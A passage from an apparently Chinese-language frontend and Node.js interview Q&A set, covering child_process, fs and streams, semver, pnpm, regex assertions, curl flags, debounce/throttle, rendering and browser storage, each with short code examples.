  "exports": {
    ".": {
      "import": "./dist/index.js",
      "require": "./dist/index.cjs"
    },
    "./utils": "./dist/utils.js"
  }
}
```

### BAS-183：process.cwd 和 __dirname 有什么区别？
**答**：
- process.cwd()：进程的当前工作目录，取决于你在哪里执行 node 命令，运行中可变。
- __dirname：当前模块文件所在目录的绝对路径，永远相对文件本身（CommonJS）。
- ESM 里没有 __dirname，用 `fileURLToPath(new URL('.', import.meta.url))` 等价替换。

```javascript
// 假设文件在 /app/scripts/run.js，你在 /app 下执行 node scripts/run.js
console.log(process.cwd());  // /app —— 随启动命令的位置变化
console.log(__dirname);      // /app/scripts —— 恒等于该文件所在目录
// ESM 等价写法
// import { fileURLToPath } from 'url';
// const __dirname = fileURLToPath(new URL('.', import.meta.url));
```

### BAS-184：exec 和 spawn 怎么选？
**答**：
- exec：走 shell 执行命令字符串，stdout/stderr 缓冲整体返回（默认上限 200KB），适合短命令、需要管道的场景。
- spawn：不走 shell，参数用数组传递（天然免疫命令注入），流式输出，适合大输出或长驻进程。
- 相关：execSync 阻塞主线程；execFile 类似 spawn 但带回调。

```javascript
const { exec, spawn } = require('child_process');
// exec：shell 字符串 + 整体缓冲，默认 200KB 上限
exec('ls -l | wc -l', (err, stdout) => console.log(stdout));
// spawn：参数数组不走 shell，流式输出，适合大文件与长进程
const ps = spawn('ffmpeg', ['-i', 'input.mp4', 'out.mp4']);
ps.stdout.on('data', chunk => process.stdout.write(chunk));
```

### BAS-185：fs 的同步、异步 API 怎么选？
**答**：
- 同步 readFileSync：CLI 脚本、启动时一次性读配置，简单但阻塞整个进程。
- 回调/promise 版（fs.promises 或 await）：服务端常规首选，不阻塞事件循环。
- createReadStream：大文件处理、边读边写、限流转发，配合流式管道。

```javascript
const fs = require('fs');
// 同步：CLI 启动时读一次配置，简单直接
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
// 异步 promise：服务端首选，不阻塞事件循环
async function load() { return JSON.parse(await fs.promises.readFile('config.json', 'utf8')); }
// 流式：GB 级日志按行处理
fs.createReadStream('app.log').pipe(process.stdout);
```

### BAS-186：stream 的背压是什么概念？
**答**：
- 读的速度远快于写时，数据会在内存里堆积；背压（backpressure）是下游告诉上游"慢一点"的机制。
- `ws.write()` 返回 false 表示写缓冲已满，应暂停读取；收到 drain 事件再恢复。
- pipe/web streams 的 pipeline 内建了背压处理，手写时必须自己 pause/resume。

```javascript
const fs = require('fs');
const rs = fs.createReadStream('big.bin');
const ws = fs.createWriteStream('out.bin');
rs.pipe(ws); // 写不过去时自动 pause 读，drain 后 resume，这就是背压

// 手写等价逻辑（理解用）
ws.on('drain', () => rs.resume());
rs.on('data', chunk => {
  if (!ws.write(chunk)) rs.pause(); // write 返回 false 说明缓冲已满
});
```

### BAS-187：nvm 和 nrm 有哪些高频操作？
**答**：
- nvm 管 Node 版本：install 装、use 切、alias default 设默认、ls 列表。
- nrm 管 npm registry：ls 列源、use 切源、test 测速。
- 注意：nvm 的版本是按 shell 生效的，`nvm alias default` 才是新终端的默认版本。

```bash
nvm install 22                  # 安装指定版本
nvm alias default 22            # 设为新终端默认版本
nvm use 20                      # 当前 shell 临时切换
nvm ls                          # 查看已装版本
nrm ls                          # 列出可用镜像源
nrm use taobao                  # 切换 registry
```

### BAS-188：怎么写一个最简单的 Node CLI 脚本？
**答**：
- 文件首行 shebang `#!/usr/bin/env node`，声明用 node 执行；chmod +x 赋执行权后可直接 `./mytool.js` 运行。
- 命令行参数从 process.argv.slice(2) 取（前两项是 node 路径和脚本路径）。
- 工程化分发：package.json 的 bin 字段登记命令名，npm link 本地模拟全局安装。

```javascript
#!/usr/bin/env node
// mytool.js —— shebang 指定用 node 执行
const args = process.argv.slice(2);  // 前两项是 node 与脚本路径
console.log('收到参数:', args);
// 用法：chmod +x mytool.js && ./mytool.js hello world
// 发布：package.json 里配 "bin": { "mytool": "./mytool.js" }，npm link 后全局可用
```

## 二十一、工具与规范速答

### BAS-189：semver 的完整规则是什么？^ 和 ~ 有什么区别？
**答**：
- 三段式 MAJOR.MINOR.PATCH：不兼容的 API 变更升 MAJOR，向后兼容的新功能升 MINOR，向后兼容的修 bug 升 PATCH。
- ^1.2.3 允许升到 <2.0.0（锁 MAJOR）；~1.2.3 只允许 <1.3.0（锁 MINOR）。
- 特殊陷阱：0.x 阶段不稳定，^0.2.3 只允许 <0.3.0（等价锁 MINOR），所以依赖 0.x 包时锁得非常死。

```bash
# MAJOR.MINOR.PATCH
# MAJOR 不兼容改动 / MINOR 向后兼容新功能 / PATCH 向后兼容修 bug
^1.2.3   # 允许 1.2.3 到 <2.0.0，锁定 MAJOR
~1.2.3   # 允许 1.2.3 到 <1.3.0，锁定 MINOR
^0.2.3   # 0.x 阶段：只允许到 <0.3.0，等价锁 MINOR
1.x      # 通配：任意 1.y.z
```

### BAS-190：conventional commits 怎么配合生成 changelog？
**答**：
- 提交格式 `type(scope): description`，type 决定版本号：feat 升 MINOR、fix 升 PATCH、`!` 或 body 里的 BREAKING CHANGE 升 MAJOR。
- 常用 type：feat/fix/docs/style/refactor/perf/test/chore，只有 feat/fix 参与用户可见的 changelog。
- 工具链：semantic-release 或 standard-version 读取提交历史，自动定版本、生成 CHANGELOG、打 tag。

```bash
git commit -m "feat(auth): 支持手机号登录"     # feat → MINOR
git commit -m "fix: 修复列表分页越界"          # fix → PATCH
git commit -m "feat!: 移除 v1 旧接口"          # ! → MAJOR 破坏性变更
# body 中写 BREAKING CHANGE: 说明迁移方式，效果等同 !
# semantic-release 按上述规则自动算版本并生成 CHANGELOG
```

### BAS-191：pnpm 的 monorepo 常用命令有哪些？
**答**：
- `pnpm -r run <cmd>`：对所有包含该脚本的包递归执行，默认按依赖拓扑排序。
- `pnpm --filter <pkg> <cmd>`：只对指定包（支持包名、路径 glob）执行，是最常用的定向操作。
- 依赖管理：`pnpm add x --filter a` 给单包装依赖；`-w` 装到 workspace 根（声明成全局开发依赖）。

```bash
pnpm -r run build                    # 递归所有包按拓扑序构建
pnpm --filter web dev                # 只跑 web 包的 dev 脚本
pnpm add axios --filter web          # 给 web 包添加依赖
pnpm add eslint -wD                  # 装到 workspace 根为开发依赖
pnpm -r list --depth -1              # 列出所有包
```

### BAS-192：正则的命名捕获组和 lookaround 怎么写？
**答**：
- 命名捕获组 `(?<name>...)`，结果在 match 的 groups 里取，比数组下标可读性高得多。
- lookahead `(?=...)` 匹配后面是某模式的位置，lookbehind `(?<=...)` 匹配前面是某模式的位置；`!` 版本是否定。
- 断言只"看"不"吃"字符：匹配结果里不包含断言部分，常用于提取定界符之间的内容。

```javascript
const re = /(?<year>\d{4})-(?<month>\d{2})/;      // 命名捕获组
const m = '2026-11-01'.match(re);
console.log(m.groups.year, m.groups.month);        // 2026 11

console.log('$99'.match(/(?<=\$)\d+/)[0]);         // 99 —— 后行断言，不匹配 $ 本身
console.log('99元'.match(/\d+(?=元)/)[0]);         // 99 —— 先行断言，不匹配 元
console.log('abc'.match(/(?<!a)b/));               // null —— 否定后行断言
```

### BAS-193：JSON5、YAML 和 JSON 有什么差异？
**答**：
- JSON：键必须双引号、不许注释、不许尾逗号——机器友好但人不友好。
- JSON5：允许单引号、无引号键、注释、尾逗号、十六进制数，是"给配置用的 JSON"。
- YAML：缩进表达层级、标量可不加引号，还支持锚点引用与多文档；代价是缩进错一位就语义错，且有莫明安全坑（非字符串类型隐式转换）。

```yaml
# JSON：键必须双引号、无注释、无尾逗号
# JSON5：单引号、注释、尾逗号、十六进制都允许
# YAML：缩进即层级，标量可不加引号
version: 2
jobs:
  build:
    steps: [checkout, run-tests]   # 流式写法等价于列表
    retries: 3                     # 数字不加引号，解析为 number
```

### BAS-194：EditorConfig 和 Prettier 冲突了怎么协调？
**答**：
- 定位不同：EditorConfig 跨编辑器管最基础的缩进/换行/字符集，对任何语言生效；Prettier 只管代码格式化且可配置项更多。
- 协调原则：同一件事只在一处声明——缩进、换行符、字符集交给 .editorconfig，Prettier 里删掉重复配置项，避免两处打架。
- Prettier 会读取 .editorconfig 作为未显式配置项的兜底，但 Prettier 自身配置优先级更高。

```ini
# .editorconfig：跨语言的底线配置
root = true

[*]
charset = utf-8
end_of_line = lf
indent_style = space
indent_size = 2
insert_final_newline = true
# 协调：Prettier 不再重复配 tabWidth/useTabs，避免两处不一致
```

### BAS-195：curl 有哪些前端高频参数？
**答**：
- 看过程：`-i` 带响应头、`-v` 完整握手与请求头调试、`-o` 落文件。
- 发请求：`-X` 指方法、`-H` 加头、`-d` 带请求体（默认触发 POST）、`-L` 跟随重定向。
- 调试利器：`-w '%{http_code}'` 只输出状态码，适合写进脚本做健康检查。

```bash
curl -i http://localhost:3000/api/users          # 显示响应头
curl -v http://localhost:3000/api/users          # 显示完整请求响应过程
curl -X POST -H 'Content-Type: application/json' \
     -d '{"name":"a"}' http://localhost:3000/api/users
curl -L http://example.com                       # 跟随重定向
curl -s -o /dev/null -w '%{http_code}' http://x  # 只看状态码
```

## 二十二、综合辨析

### BAS-196：防抖和节流怎么一句话区分？各选什么场景？
**答**：
- 一句话：防抖是"停手后才执行，一直动手就一直等"；节流是"固定频率放行，期间再急也只执行一次"。
- 防抖场景：搜索框输入联想、表单校验、resize 结束后的重算——只关心最后一次。
- 节流场景：滚动加载、鼠标移动跟随、按钮防连点——关心过程但要限频。

```javascript
const debounce = (fn, ms) => {
  let t;
  return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); };
};
const throttle = (fn, ms) => {
  let ok = true;
  return (...a) => {
    if (!ok) return;
    ok = false;
    setTimeout(() => { fn(...a); ok = true; }, ms);
  };
};
// 防抖 → 搜索联想；节流 → 滚动/resize 监听
```

### BAS-197：重绘和重排怎么一句话区分？代价差在哪？
**答**：
- 一句话：重排（reflow/layout）是几何变了要重新算布局，重绘（repaint）只是外观变了重新画，重排必然引发重绘，反之不然。
- 代价：重排远大于重绘；连续"改样式→读几何属性"会强制同步布局，是常见性能坑。
- 优化：批量读写分离、用 DocumentFragment、能用 transform/opacity 就别动几何属性。

```javascript
el.style.width = '100px';        // 重排：几何变化，触发 layout + paint
el.style.color = 'red';          // 重绘：只触发 paint
el.style.transform = 'scale(2)'; // 合成：多数情况跳过 layout 与 paint
console.log(el.offsetWidth);     // 读几何属性 → 强制同步布局，注意读写分离
```

### BAS-198：cookie、localStorage、sessionStorage 一句话辨析？
**答**：
- cookie：约 4KB、每个 HTTP 请求自动携带、可设过期与 HttpOnly——适合服务端会话凭证。
- localStorage：5~10MB、持久化、同源所有标签页共享、不随请求发送——适合主题、偏好等本地数据。
- sessionStorage：标签页级会话，关标签即清——适合一次性表单草稿、当页状态。

```javascript
document.cookie = 'sid=1; Max-Age=86400; Secure'; // 4KB，随请求自动携带
localStorage.setItem('theme', 'dark');            // 持久，同源跨标签共享
sessionStorage.setItem('draft', 'step2');         // 标签页关闭即清
// 速记：要跟请求走用 cookie，要长期本地存用 localStorage，会话级用 sessionStorage
```

### BAS-199：CSR 和 SSR 怎么一句话辨析？
**答**：
- CSR：浏览器下载 JS 后客户端渲染，首屏慢（白屏）、SEO 弱，但后续交互是 SPA 体验。
- SSR：服务端直接吐出完整 HTML，首屏快、SEO 好，代价是服务端开销和 hydration 复杂度。
- 折中方案：纯静态内容用 SSG 预渲染；Next/Nuxt 做同构渲染，两者兼得但架构复杂度上升。

```html
<!-- CSR：服务端只发一个空壳，内容靠 JS 渲染 -->
<div id="root"></div>
<script src="app.js"></script>

<!-- SSR：服务端直接返回带内容的 HTML，首屏立即可读 -->
<div id="root">
  <h1>服务端渲染好的标题</h1>
  <p>SEO 爬虫直接可读</p>
</div>
<script src="app.js"></script>
<!-- app.js 负责 hydration：接上事件与状态 -->
```

### BAS-200：弱网环境下前端有哪些典型表现？怎么感知弱网？
**答**：
- 典型表现：白屏时间长、图片裂图、请求超时排队、首屏 TTFB 高、交互反馈卡顿。
- 感知手段：Network Information API（effectiveType/downlink/rtt）运行时降级、Performance API 看 TTFB 与资源耗时、埋点上报做用户体验监控。
- 感知后动作：切轻量资源、延迟非关键请求、骨架屏兜底、缓存优先展示。

```javascript
// 弱网感知与降级
const conn = navigator.connection;
if (conn && (conn.saveData || conn.rtt > 500 || conn.effectiveType === '2g')) {
  document.documentElement.classList.add('lite'); // 切轻量图、关动效
}
// Performance 侧看首字节时间
const nav = performance.getEntriesByType('navigation')[0];
console.log('TTFB', nav.responseStart - nav.requestStart);
// 验证：DevTools Network 面板限速到 Slow 3G 复现
```
